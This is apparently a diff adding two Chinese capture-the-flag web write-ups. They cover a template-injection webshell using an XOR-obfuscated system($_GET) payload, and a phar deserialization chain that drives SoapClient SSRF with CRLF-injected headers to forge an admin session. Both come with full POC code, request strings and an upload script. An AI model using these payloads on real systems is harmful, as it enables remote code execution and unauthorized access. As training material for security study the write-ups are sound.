@@ -6942,8 +6942,6 @@ for i in range(1, 70):
 
 ## DataCon showmetrick
 
-
-
 ```PHP
 <?php
 error_reporting(0);
@@ -7048,6 +7046,517 @@ var1[]=1&var2[]=2&var3=1a&var4=data://text/plain,Welcome%20to%20THUCTF2021!&thuc
 关于蚁剑的插件安装直接去插件市场安装就行，但是需要挂代理，不然加载不出来
 
 ![image-20240419022344159](CTF.assets/image-20240419022344159.png)
+
+## DataCon Simple PHP
+
+> 参考：https://blog.csdn.net/qq_41315957/article/details/123056061
+
+进来看到是一个注册和输入框，试了一手SQL注入没有效果，注册登录到处点点
+
+![image-20240420003226035](CTF.assets/image-20240420003226035.png)
+
+一边点，Burp Suite一边抓包，发现一个任意文件读取漏洞，成功读到`/etc/passwd`，既然如此，那第一反应肯定是读源码的！
+
+![image-20240420003537760](CTF.assets/image-20240420003537760.png)
+
+```php
+# get_pic.php
+<?php
+error_reporting(0);
+$image = (string)$_GET['image'];
+echo '<div class="img"> <img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" /> </div>';
+?>
+```
+
+```php
+# index.php
+<?php
+error_reporting(0);
+if(isset($_POST['user']) && isset($_POST['pass'])){
+    $hash_user = md5($_POST['user']);
+    $hash_pass = 'zsf'.md5($_POST['pass']);
+    # 如果 $_POST['punctuation'] 存在那就是注册操作，否则就是登录操作
+    if(isset($_POST['punctuation'])){
+        //filter
+        if (strlen($_POST['user']) > 6){
+            echo("<script>alert('Username is too long!');</script>");
+        }
+        elseif(strlen($_POST['website']) > 25){
+            echo("<script>alert('Website is too long!');</script>");
+        }
+        elseif(strlen($_POST['punctuation']) > 1000){
+            echo("<script>alert('Punctuation is too long!');</script>");
+        }
+        else{
+            # 正则匹配：字母数字下划线还有各种符号
+            if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
+                if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
+                    # 正则匹配：数字字母 ?>
+                    $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
+                    # 获取模板内容，并将里面的占位符逐行替换
+                    $template = file_get_contents('./template.html');
+                    $content = str_replace("__USER__", $_POST['user'], $template);
+                    $content = str_replace("__PASS__", $hash_pass, $content);
+                    $content = str_replace("__WEBSITE__", $_POST['website'], $content);
+                    $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
+                    # 这里文件名是 用户名 的哈希值
+                    file_put_contents('sandbox/'.$hash_user.'.php', $content);
+                    echo("<script>alert('Successed!');</script>");
+                }
+                else{
+                    echo("<script>alert('Invalid chars in website!');</script>");
+                }
+            }
+            else{
+                echo("<script>alert('Invalid chars in username!');</script>");
+            }
+        }
+    }
+    else{
+        setcookie("user", $_POST['user'], time()+3600);
+        setcookie("pass", $hash_pass, time()+3600);
+        Header("Location:sandbox/$hash_user.php");
+    }
+}
+?>
+```
+
+```php
+# template.html 部分~
+<div id="start_block"> <a title="开始" id="start_btn"></a>
+    <div id="start_item">
+      <ul class="item admin">
+        <li><span class="adminImg"></span>
+		<?php
+			error_reporting(0);
+			$user = ((string)__USER__);
+			$pass = ((string)__PASS__);
+			
+			if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
+				echo($_COOKIE['user']);
+			}
+			else{
+				die("<script>alert('Permission denied!');</script>");
+			}
+		?>
+		</li>
+      </ul>
+      <ul class="item">
+        <li><span class="sitting_btn"></span>系统设置</li>
+        <li><span class="help_btn"></span>使用指南 <b></b></li>
+        <li><span class="about_btn"></span>关于我们</li>
+        <li><span class="logout_btn"></span>退出系统</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<a href="#" class="powered_by">__PUNC__</a>
+<ul id="deskIcon">
+  <li class="desktop_icon" id="win5" path="https://image.baidu.com/"> <span class="icon"><img src="../img/icon4.png"/></span>
+    <div class="text">图片
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win6" path="http://www.4399.com/"> <span class="icon"><img src="../img/icon5.png"/></span>
+    <div class="text">游戏
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win10" path="../get_pic.php?image=img/haokangde.png"> <span class="icon"><img src="../img/icon4.png"/></span>
+    <div class="text"><b>好康的</b>
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win16" path="__WEBSITE__"> <span class="icon"><img src="../img/icon10.png"/></span>
+```
+
+### 代码注入分析
+
+这里有任何不懂的话都需要配合上面的模板来分析！
+
+```php
+if (strlen($_POST['user']) > 6){
+            echo("<script>alert('Username is too long!');</script>");
+        }
+        elseif(strlen($_POST['website']) > 25){
+            echo("<script>alert('Website is too long!');</script>");
+        }
+        elseif(strlen($_POST['punctuation']) > 1000){
+            echo("<script>alert('Punctuation is too long!');</script>");
+        }
+        else{
+            # 正则匹配：字母数字下划线还有各种符号
+            if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
+                if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
+                    # 正则匹配：数字字母 ?>
+                    $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
+                    # 获取模板内容，并将里面的占位符逐行替换
+                    $template = file_get_contents('./template.html');
+                    $content = str_replace("__USER__", $_POST['user'], $template);
+                    $content = str_replace("__PASS__", $hash_pass, $content);
+                    $content = str_replace("__WEBSITE__", $_POST['website'], $content);
+                    $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
+                    # 这里文件名是 用户名 的哈希值
+                    file_put_contents('sandbox/'.$hash_user.'.php', $content);
+                    echo("<script>alert('Successed!');</script>");
+                }
+                else{
+                    echo("<script>alert('Invalid chars in website!');</script>");
+                }
+            }
+```
+
+第一眼看到有`file_put_contents`函数，第一反应就是写webshell，再看后缀是PHP，可以执行的！`$content`也有一定的内容可控，下面看`str_replace`函数
+
++ `__USER__`有6位的长度限制，基本上就不够长度去写webshell了
++ `__PASS__`是哈希值，也没啥希望
++ `__WEBSITE__`有25位的长度，有足够的长度写webshell，但是过滤了`< >`，做不了PHP标签
++ `__PUNC__`没有长度限制并且过滤了字符和数字，但是参看**无字符数字RCE**，这里可以做异或运算绕过，可是函数过滤了`>?`
+
+这里再细看模板文件，如果可以在`$user`处做命令拼接并插入注释符`/*`，再用注释符`*/`接上后面的`__PUNC__`就可以将`__PUNC__`这一块的内容逃出来，变成可执行的PHP代码，后面的HTML代码由于PHP无法执行，直接用`/*`注释掉，像下面这样
+
+**注：这里有一点很关键，`__USER__`是过滤掉`;`的，会令`$user`处没有`;`导致PHP语法错误，所以一定要在`__PUNC__`补上**
+
+![image-20240420005510233](CTF.assets/image-20240420005510233.png)
+
+本地测试成功：
+
+![image-20240420010259368](CTF.assets/image-20240420010259368.png)
+
+最后payload：
+
+```
+# 这里的异或结果是：system($_GET['____'])
+
+user=1)/*&pass=1&website=1&punctuation=*/;$_+%3d+'("((%25-'^'[[[\%40%40'%3b$__+%3d+"!'%25("^'~``|'%3b$___+%3d+$$__%3b$_($___['____'])%3b+/*
+```
+
+发包！
+
+![image-20240420010518855](CTF.assets/image-20240420010518855.png)
+
+访问webshell，注意这里的文件名：`md5('1)/*') = 167d74fbbfccd26d2e5e09e97c9294a3`
+
+![image-20240420010544470](CTF.assets/image-20240420010544470.png)
+
+![image-20240420010732553](CTF.assets/image-20240420010732553.png)
+
+```
+flag: TNG{e99be155-93c1-44e1-8da9-c1f1a44c773f}
+```
+
+## DataCon showmeadmin
+
+### 1. 前置知识
+
+#### 1.1 [Soap](https://so.csdn.net/so/search?q=Soap&spm=1001.2101.3001.7020) SSRF
+
+php中有一个SoapClient类，该类的构造函数如下：
+public SoapClient :: SoapClient (mixed $wsdl [,array $options ])
+
+第一个参数是用来指明是否是wsdl模式。
+
+第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
+
+举个简单例子：
+
+SoapClient是php内置的类，**当\**__call\**方法被触发后（调用不存在方法）**，它可以发送HTTP和HTTPS请求。该类的构造函数如下：
+
+```php
+<?php
+$target='http://localhost:6666';
+$a = new SoapClient(null,array('location' => $target,'uri'=> "123"));
+$a->func();
+```
+
+在执行一个SoapClient没有的成员函数时，会自动调用该类的__Call方法，访问如下php文件将会向$target发送一个soap请求，并且uri选项是我们可控的地方。
+
+##### CRLF Injection漏洞
+
+CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。
+
+基于这点二开出一个PHP脚本如下：
+
+```php
+<?php
+$target='http://192.168.231.153:6666';
+$a = new SoapClient(null,array('location' => $target, 'user_agent' => "Your-Agent\r\nCookie: Your-Cookie\r\nX-Forwarded-For: 127.0.0.1",'uri'=> "123"));
+
+# 注意：当调用SoapClient类的不存在的方式时，会自动触发__call方法并发送HTTP请求，所以下面的方法名随便写都行
+$a->func();
+```
+
+![image-20240420171013757](CTF.assets/image-20240420171013757.png)
+
+#### 1.2 php session 机制
+
+**php session运行机制就是客户端将session id传入到服务器中，服务器再根据session id找到对应的文件并将其反序列化得到session值，然后保存的时候先序列化再写入**
+
+这里有一点容易混淆，Cookie是存储在客户端的，所以客户端可以随意修改或伪造Cookie，但是Session是存储在服务端的，客户端是看不到Session并且无法修改的
+
+### 题目名称：showmeadmin
+
+进来直接给出题目源码
+
+```php
+# index.php
+<?php
+session_start();
+
+error_reporting(0);
+highlight_file(__FILE__);
+include_once 'class.php';
+
+//flag.php
+
+if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1')
+    $_SESSION['admin'] = true;
+else
+    $_SESSION['admin'] = false;
+
+if (!empty($_FILES['image']['tmp_name'])) {
+
+    $tmp_name = $_FILES['image']['tmp_name'];
+    $filename = $_FILES['image']['name'] ?: $_GET['file'];
+    if (is_uploaded_file($tmp_name)) {
+        $upload = new upload($tmp_name, $filename);
+        $upload->uploadImage();
+    }
+} else {
+    if (isset($_GET['file']) && substr($_GET['file'], 0, 3) === 'php' && substr($_GET['file'], -3, 3) === 'php')
+        echo file_get_contents($_GET['file']);
+}
+?>
+```
+
+根据最后一条if语句，要求传入`$_GET['file']`必须以php开头，php结尾，这里第一反应就是`php://filter`
+
+```php
+if (isset($_GET['file']) && substr($_GET['file'], 0, 3) === 'php' && substr($_GET['file'], -3, 3) === 'php')
+        echo file_get_contents($_GET['file']);
+}
+```
+
+直接用`php://filter`读到剩下的源码
+
+```php
+flag.php
+<?php
+session_start();
+if (isset($_SESSION['admin']) && $_SESSION['admin'] === true)
+    echo file_get_contents('flag');
+else
+    echo "Only localhost admin can get the flag!";
+
+
+```
+
+```php
+class.php
+<?php
+
+class upload
+{
+    public $check;
+    public $tmp_name;
+    public $filename;
+
+    public function __construct($tmp_name, $filename)
+    {
+        $this->check = new Check();
+        $this->filename = $filename;
+        $this->tmp_name = $tmp_name;
+    }
+
+    # todo：文件存储方法
+    public function uploadImage()
+    {
+        if ($this->check->checkName($this->filename)) {
+            $filepath = "uploads/" . $this->filename;
+            # 文件合法则保存到 uploads 文件夹中
+            if (move_uploaded_file($this->tmp_name, $filepath)) {
+                echo "Upload success! File is located in " . $filepath;
+            } else
+                echo "Upload fail!";
+        } else
+            echo "Hacker!";
+    }
+
+    # todo：检查文件内容是否合法（有没有 <?php），有就直接删除并输出 Dangerous file!
+    public function __destruct()
+    {
+        $filepath = dirname(__FILE__) . "/uploads/" . $this->filename;
+        if (file_exists($filepath)) {
+            if (!$this->check->checkContent($filepath)) {
+                @unlink($filepath);
+                echo "\n";
+                echo "Dangerous file!";
+            }
+
+        }
+    }
+}
+
+class Check
+{
+    public $allow_exts;
+
+    public function __construct()
+    {
+        # 后缀名白名单
+        $this->allow_exts = array('jpg', 'png', 'gif');
+    }
+
+    # todo: 检查文件名是否合法
+    public function checkName($filename)
+    {
+        # 获取 文件后缀
+        $ext = pathinfo($filename, PATHINFO_EXTENSION);
+        # 文件名不可以有 /
+        if (stristr($filename, "/") !== false)
+            return false;
+        else
+            # 检查文件后缀是否符合白名单
+            return in_array($ext, $this->allow_exts, true);
+    }
+
+    # todo: 检查文件内容是否有 <?php
+    public function checkContent($filename)
+    {
+        if (stristr(file_get_contents($filename), "<?php") !== false)
+            return false;
+        else
+            return true;
+    }
+}
+
+```
+
+对于CTF题来讲，看到类和文件上传的时候，基本上考点就是phar文件上传了，这题目标就是访问`/flag.php`拿到flag，但是flag需要本地才能拿到，**而`$_SERVER['REMOTE_ADDR']`是不能伪造的**，所以只能寻找SSRF漏洞
+
+```php
+if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1')
+    $_SESSION['admin'] = true;
+else
+    $_SESSION['admin'] = false;
+```
+
+思路：根据前置知识使用phar反序列化出`Soap`类并构造SSRF报文去访问`index.php`，拿到带有` $_SESSION['admin'] = true`的PHPSESSIONID并拿着这个PHPSESSIONID再访问flag.php
+
+**反序列化思路**
+
+当触发`Soap`的`__call`方法的时候就会自动发送HTTP报文，即触发`soap`类的不存在的方法，这里有两个地方可以触发，由于`index.php`是先先调用`uploadImage`方法的，所以会触发`uploadImage->$this->check->checkName($this->filename)`
+
+<img src="CTF.assets/image-20240420175937389.png" alt="image-20240420175937389" style="zoom:67%;" />
+
+基于此构造出反序列化POC代码
+
+```php
+<?php
+
+class upload
+{
+    public $check;
+    public $filename;                           # 这里需要跟 phar 文件名保持一致
+    public $tmp_name = '1';
+
+//    public function __destruct()
+//    {
+////        $this->check->checkContent();         测试使用，反序列化的时候不需要
+//    }
+
+    public function uploadImage()
+    {
+        if ($this->check->checkName($this->filename)) {
+            $filepath = "uploads/" . $this->filename;
+            if (move_uploaded_file($this->tmp_name, $filepath)) {
+                echo "Upload success! File is located in " . $filepath;
+            } else
+                echo "Upload fail!";
+        } else
+            echo "Hacker!";
+    }
+}
+
+$u = new upload();
+# 这里要记住将 Cookie 改成 PHPSESSID=xxx 的格式
+$s = new SoapClient(null,array('location' => 'http://192.168.231.153:6666', 'user_agent' => "Your-Agent\r\nCookie: PHPSESSID=Your-Cookie\r\nX-Forwarded-For: 127.0.0.1",'uri'=> "123"));
+
+$u->filename = 'shell.jpg';
+$u->check = $s;
+$u->uploadImage();
+```
+
+kali测试成功！
+
+![image-20240420180227563](CTF.assets/image-20240420180227563.png)
+
+接下来要做的是将这段代码打包进phar文件并上传
+
+```php
+<?php
+
+class upload
+{
+    public $check;
+    public $filename;                           # 这里需要跟 phar 文件名保持一致
+    public $tmp_name = '1';
+
+//    public function __destruct()
+//    {
+////        $this->check->checkContent();         测试使用，反序列化的时候不需要
+//    }
+
+    public function uploadImage()
+    {
+        if ($this->check->checkName($this->filename)) {
+            $filepath = "uploads/" . $this->filename;
+            if (move_uploaded_file($this->tmp_name, $filepath)) {
+                echo "Upload success! File is located in " . $filepath;
+            } else
+                echo "Upload fail!";
+        } else
+            echo "Hacker!";
+    }
+}
+
+$u = new upload();
+$s = new SoapClient(null,array('location' => 'http://127.0.0.1:80', 'user_agent' => "Your-Agent\r\nCookie: PHPSESSID=Your-Cookie\r\nX-Forwarded-For: 127.0.0.1",'uri'=> "123"));
+
+$u->filename = 'shell.jpg';
+$u->check = $s;
+
+$phar = new Phar("shell.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub('<? __HALT_COMPILER(); ?>');
+$phar->setMetadata($u);
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+$phar->stopBuffering();    //签名自动计算
+rename("shell.phar", "shell.jpg");
+```
+
+python 上传文件到服务器上
+
+```py
+import requests
+
+with open('shell.jpg', 'rb') as f:
+    files = {'image': f}
+    response = requests.post('http://112.74.186.148:49201/', files=files)
+
+print(response.status_code)
+print(response.content)
+```
+
+![image-20240420182849520](CTF.assets/image-20240420182849520.png)
+
+Burp Suite访问`file=php://filter/resource=phar://uploads/shell.jpg/shell.php`触发`phar`的反序列化进行SSRF攻击
+
+![image-20240420183036769](CTF.assets/image-20240420183036769.png)
+
+带着`admin=True`的SESSIONID访问flag
+
+![image-20240420183055814](CTF.assets/image-20240420183055814.png)
 
 
 
